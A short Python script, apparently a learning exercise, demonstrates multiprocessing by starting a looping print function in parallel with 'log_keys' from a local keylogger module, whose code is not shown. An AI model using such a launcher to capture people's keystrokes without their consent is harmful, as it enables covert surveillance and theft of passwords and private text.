# Multiprocssing for running multiple functions parallely
# Corey Schafer Multiprocessing: https://www.youtube.com/watch?v=fKl2JW_qrso
# https://docs.python.org/3/library/multiprocessing.html

import time, multiprocessing as mp 
import keylogger 

def fun():
    while True:
        print("fun!")
        time.sleep(.5)

# For a complicated explanation of why the if __name__ == '__main__' part
# is necessary for multiprocessing, see this: 
# https://docs.python.org/3/library/multiprocessing.html#multiprocessing-programming
if __name__ == "__main__":

    # create a process
    p1 = mp.Process(target=keylogger.log_keys)
    p2 = mp.Process(target=fun)

    # start that process
    p1.start()
    p2.start()

    # make the script wait for the process to terminate before the script ends
    p1.join()
    p2.join()



